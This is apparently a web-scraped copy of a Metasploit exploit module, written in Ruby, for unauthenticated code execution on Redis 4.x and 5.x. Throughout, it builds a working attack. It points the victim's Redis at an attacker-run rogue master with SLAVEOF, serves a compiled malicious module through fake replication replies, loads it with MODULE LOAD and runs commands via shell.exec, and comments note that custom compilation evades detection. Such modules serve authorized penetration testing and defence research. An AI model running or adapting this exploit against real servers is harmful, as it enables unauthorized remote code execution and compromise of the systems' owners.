# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Redis

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Redis Unauthenticated Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module can be used to leverage the extension functionality added by Redis 4.x and 5.x
        to execute arbitrary code. To transmit the given extension it makes use of the feature of Redis
        which called replication between master and slave.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Green-m  <greenm.xxoo[at]gmail.com>&#039;     # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf&#039;],
          [ &#039;URL&#039;, &#039;https://github.com/RedisLabs/RedisModulesSDK&#039;]
        ],

      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;,  {} ],
        ],
      &#039;DefaultOptions&#039; => {
          &#039;SRVPORT&#039; => &#039;6379&#039;
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Nov 13 2018&#039;,
      &#039;DefaultTarget&#039;  => 0,
      &#039;Notes&#039;          =>
        {
          &#039;Stability&#039;   => [ SERVICE_RESOURCE_LOSS],
          &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS, ]
        },
      ))

    register_options(
      [
        Opt::RPORT(6379),
        OptBool.new(&#039;CUSTOM&#039;, [true, &#039;Whether compile payload file during exploiting&#039;, true])
      ]
    )

    register_advanced_options(
      [
        OptString.new(&#039;RedisModuleInit&#039;, [false, &#039;The command of module to load and unload. Random string as default.&#039;]),
        OptString.new(&#039;RedisModuleTrigger&#039;, [false, &#039;The command of module to trigger the given function. Random string as default.&#039;]),
        OptString.new(&#039;RedisModuleName&#039;, [false, &#039;The name of module to load at first. Random string as default.&#039;])
      ]
    )
    deregister_options(&#039;URIPATH&#039;, &#039;THREADS&#039;, &#039;SSLCert&#039;)
  end

  #
  # Now tested on redis 4.x and 5.x
  #
  def check
    connect
    # they are only vulnerable if we can run the CONFIG command, so try that
    return Exploit::CheckCode::Safe unless (config_data = redis_command(&#039;CONFIG&#039;, &#039;GET&#039;, &#039;*&#039;)) && config_data =~ /dbfilename/

    if (info_data = redis_command(&#039;INFO&#039;)) && /redis_version:(?<redis_version>\S+)/ =~ info_data
      report_redis(redis_version)
    end

    Exploit::CheckCode::Vulnerable
  ensure
    disconnect
  end

  def exploit
    if check_custom
      @module_init_name = datastore[&#039;RedisModuleInit&#039;]    || Rex::Text.rand_text_alpha_lower(4..8)
      @module_cmd       = datastore[&#039;RedisModuleTrigger&#039;] || "#{@module_init_name}.#{Rex::Text.rand_text_alpha_lower(4..8)}"
    else
      @module_init_name = &#039;shell&#039;
      @module_cmd       = &#039;shell.exec&#039;
    end

    if srvhost == &#039;0.0.0.0&#039;
      fail_with(Failure::BadConfig, &#039;Make sure SRVHOST not be 0.0.0.0, or the slave failed to find master.&#039;)
    end

    #
    # Prepare for payload.
    #
    #  1. Use custcomed payload, it would compile a brand new file during running, which is more undetectable.
    #     It&#039;s only worked on linux system.
    #
    #  2. Use compiled payload, it&#039;s avaiable on all OS, however more detectable.
    #
    if check_custom
      buf = create_payload
      generate_code_file(buf)
      compile_payload
    end

    connect

    #
    # Send the payload.
    #
    redis_command(&#039;SLAVEOF&#039;, srvhost, srvport.to_s)
    redis_command(&#039;CONFIG&#039;, &#039;SET&#039;, &#039;dbfilename&#039;, "#{module_file}")
    ::IO.select(nil, nil, nil, 2.0)

    # start the rogue server
    start_rogue_server
    # waiting for victim to receive the payload.
    Rex.sleep(1)
    redis_command(&#039;MODULE&#039;, &#039;LOAD&#039;, "./#{module_file}")
    redis_command(&#039;SLAVEOF&#039;, &#039;NO&#039;, &#039;ONE&#039;)

    # Trigger it.
    print_status(&#039;Sending command to trigger payload.&#039;)
    pull_the_trigger

    # Clean up
    Rex.sleep(2)
    register_file_for_cleanup("./#{module_file}")
    #redis_command(&#039;CONFIG&#039;, &#039;SET&#039;, &#039;dbfilename&#039;, &#039;dump.rdb&#039;)
    #redis_command(&#039;MODULE&#039;, &#039;UNLOAD&#039;, "#{@module_init_name}")

  ensure
    disconnect
  end

  #
  #
  def start_rogue_server
    socket = Rex::Socket::TcpServer.create({&#039;LocalHost&#039;=>srvhost,&#039;LocalPort&#039;=>srvport})
    print_status("Listening on #{srvhost}:#{srvport}")
    rsock = socket.accept()
    vprint_status(&#039;Accepted a connection&#039;)

    # Start negotiation
    while true
      request = rsock.read(1024)
      vprint_status("in<<< #{request.inspect}")
      response = ""
      finish = false

      case
      when request.include?(&#039;PING&#039;)
        response = "+PONG\r\n"
      when request.include?(&#039;REPLCONF&#039;)
        response = "+OK\r\n"
      when request.include?(&#039;PSYNC&#039;) || request.include?(&#039;SYNC&#039;)
        response  = "+FULLRESYNC #{&#039;Z&#039;*40} 1\r\n"
        response << "$#{payload_bin.length}\r\n"
        response << "#{payload_bin}\r\n"
        finish = true
      end

      if response.length < 200
        vprint_status("out>>> #{response.inspect}")
      else
        vprint_status("out>>> #{response.inspect[0..100]}......#{response.inspect[-100..-1]}")
      end

      rsock.put(response)

      if finish
        print_status(&#039;Rogue server close...&#039;)
        rsock.close()
        socket.close()
        break
      end
    end
  end

  def pull_the_trigger
    if check_custom
      redis_command("#{@module_cmd}")
    else
      execute_cmdstager
    end
  end

  #
  # And the command of module is hard-coded.
  #
  def execute_command(cmd, opts = {})
    redis_command(&#039;shell.exec&#039;,"#{cmd.to_s}") rescue nil
  end

  #
  # Generate source code file of payload to be compiled dynamicly.
  #
  def generate_code_file(buf)
    template       = File.read(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;redis&#039;, &#039;module.erb&#039;))
    File.open(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;redis&#039;, &#039;module.c&#039;), &#039;wb&#039;) { |file| file.write(ERB.new(template).result(binding))}
  end

  def compile_payload
    make_file = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;redis&#039;, &#039;Makefile&#039;)
    vprint_status("Clean old files")
    vprint_status(%x|make -C #{File.dirname(make_file)}/rmutil clean|)
    vprint_status(%x|make -C #{File.dirname(make_file)} clean|)

    print_status(&#039;Compile redis module extension file&#039;)
    res = %x|make -C #{File.dirname(make_file)} -f #{make_file} && echo true|
    if res.include? &#039;true&#039;
      print_good("Payload generated successfully! ")
    else
      print_error(res)
      fail_with(Failure::BadConfig, &#039;Check config of gcc compiler.&#039;)
    end
  end

  #
  # check the environment for compile payload to so file.
  #
  def check_env
    # check if linux
    return false unless %x|uname -s 2>/dev/null|.include? "Linux"
    # check if gcc installed
    return false unless %x|command -v gcc && echo true|.include? "true"
    # check if ld installed
    return false unless %x|command -v ld && echo true|.include? "true"

    true
  end

  def check_custom
    return @custom_payload if @custom_payload

    @custom_payload = false
    @custom_payload = true if check_env && datastore[&#039;CUSTOM&#039;]

    @custom_payload
  end

  def module_file
    return @module_file if @module_file
    @module_file = datastore[&#039;RedisModuleName&#039;]  || "#{Rex::Text.rand_text_alpha_lower(4..8)}.so"
  end

  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, &#039;c&#039;, &#039;buf&#039;)
  end

  def payload_bin
    return @payload_bin if @payload_bin
    if check_custom
      @payload_bin = File.binread(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;redis&#039;, &#039;module.so&#039;))
    else
      @payload_bin = File.binread(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;redis&#039;, &#039;exp&#039;,  &#039;exp.so&#039;))
    end
    @payload_bin
  end
end

